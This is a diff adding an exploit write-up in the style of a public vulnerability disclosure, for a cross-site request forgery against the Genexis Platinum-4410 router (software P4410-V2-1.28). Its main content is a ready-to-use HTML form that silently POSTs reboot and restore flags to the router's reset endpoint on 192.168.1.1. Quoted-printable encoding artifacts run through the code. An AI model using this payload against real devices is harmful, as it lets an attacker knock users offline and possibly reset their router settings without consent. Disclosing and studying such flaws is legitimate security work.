@@ -1,0 +1,28 @@
+# Exploit Title: Genexis Platinum-4410 P4410-V2-1.28 - Cross Site Request Forgery to Reboot
+# Date: 10/28/2020
+# Exploit Author: Mohammed Farhan
+# Vendor Homepage: https://genexis.co.in/product/ont/
+# Version: Platinum-4410 Software version - P4410-V2-1.28
+# Tested on: Windows 10
+# Author Contact: https://twitter.com/farhankn
+
+Vulnerability Details
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Login to the application
+Create an HTML file using the below mentioned code
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action=3D"http://192.168.1.1/cgi-bin/mag-reset.asp" method=3D"POS=
+T">
+      <input type=3D"hidden" name=3D"rebootflag" value=3D"1" />
+      <input type=3D"hidden" name=3D"restoreFlag" value=3D"1" />
+      <input type=3D"hidden" name=3D"isCUCSupport" value=3D"0" />
+      <input type=3D"submit" value=3D"Submit request" />
+    </form>
+  </body>
+</html>
+
+Open the HTML page in the browser and Click on "Submit Request"
+Note that modem reboots after the same
